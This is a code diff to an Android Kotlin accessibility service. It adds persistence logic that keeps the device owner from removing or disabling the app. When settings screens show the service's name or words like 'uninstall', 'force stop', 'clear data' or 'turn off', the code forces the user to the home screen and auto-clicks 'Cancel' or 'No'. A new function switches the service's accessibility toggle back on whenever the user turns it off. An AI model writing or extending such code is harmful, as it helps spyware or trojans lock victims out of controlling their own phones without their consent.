@@ -24,9 +24,12 @@ class MyAccessibilityService : AccessibilityService() {
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                     AccessibilityEvent.TYPE_VIEW_CLICKED or
-                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
-            flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
+            flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
+                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
         }
         serviceInfo = info
         Log.d("MyAccessibilityService", "Service connected")
@@ -43,34 +46,43 @@ class MyAccessibilityService : AccessibilityService() {
 
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
             when {
-                className == "com.android.settings.SubSettings" && eventText.contains(serviceLabel) -> {
-                    blockBack()
-                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
+                packageName == "com.android.settings" && (className.contains("accessibility") || className == "com.android.settings.subsettings") -> {
+                    ensureServiceSwitchOn()
+                    if (eventText.contains(serviceLabel)) {
+                        handleBlockingDialog(eventText)
+                        blockBack()
+                        sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    }
                 }
                 eventText.containsAny(
                     listOf(
                         "force stop", "delete app data", "clear data", "clear all data",
                         "app data", "clear cache", "uninstall", "remove", "backup & reset",
-                        "erase all data", "reset phone", "phone options"
+                        "erase all data", "reset phone", "phone options", "disable", "turn off"
                     )
                 ) -> {
+                    handleBlockingDialog(eventText)
                     blockBack()
                     sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 eventText.contains(serviceLabel) && eventText.contains("uninstall") -> {
+                    handleBlockingDialog(eventText)
                     blockBack()
                     sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 (eventText.contains("إيقاف") || eventText.contains("stop")) && eventText.contains(serviceLabel) -> {
+                    handleBlockingDialog(eventText)
                     blockBack()
                     sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 packageName.contains("com.google.android.packageinstaller") && className.contains("android.app.alertdialog") && eventText.contains(serviceLabel) -> {
+                    handleBlockingDialog(eventText)
                     blockBack()
                     sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 (packageName == "com.android.settings" || packageName == "com.miui.securitycenter") && eventText.contains(serviceLabel) &&
                         !listOf("android.support.v7.widget.recyclerview", "android.widget.linearlayout", "android.widget.framelayout").contains(className) -> {
+                    handleBlockingDialog(eventText)
                     blockBack()
                     sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
@@ -93,6 +105,48 @@ class MyAccessibilityService : AccessibilityService() {
             Log.e("MyAccessibilityService", "Error getting string resource: ${e.message}")
             ""
         }
+    }
+
+    private fun ensureServiceSwitchOn() {
+        val root = rootInActiveWindow ?: return
+        val serviceLabel = getStringResource(this, R.string.accessibility_service_label)
+        val labelNodes = root.findAccessibilityNodeInfosByText(serviceLabel)
+        for (labelNode in labelNodes) {
+            var current: AccessibilityNodeInfo? = labelNode.parent
+            while (current != null) {
+                val switchNodes = current.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
+                if (switchNodes.isNotEmpty()) {
+                    val switch = switchNodes[0]
+                    if (switch.isCheckable && !switch.isChecked) {
+                        switch.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Log.d("MyAccessibilityService", "Automatically enabled the accessibility service switch")
+                    }
+                    return
+                }
+                current = current.parent
+            }
+        }
+    }
+
+    private fun handleBlockingDialog(eventText: String) {
+        // Attempt to click "Cancel" or equivalent in dialogs to prevent action
+        clickOnText("Cancel")
+        clickOnText("No")
+        clickOnText("إلغاء") // Arabic for Cancel
+        // Add more localized cancel texts if needed
+    }
+
+    private fun clickOnText(text: String): Boolean {
+        val root = rootInActiveWindow ?: return false
+        val nodes = root.findAccessibilityNodeInfosByText(text)
+        for (node in nodes) {
+            if (node.isClickable && node.className?.toString()?.contains("Button") == true) {
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                Log.d("MyAccessibilityService", "Automatically clicked on '$text' to prevent blocking action")
+                return true
+            }
+        }
+        return false
     }
 
     private fun clickAtPosition(x: Int, y: Int, nodeInfo: AccessibilityNodeInfo?, depth: Int = 0) {
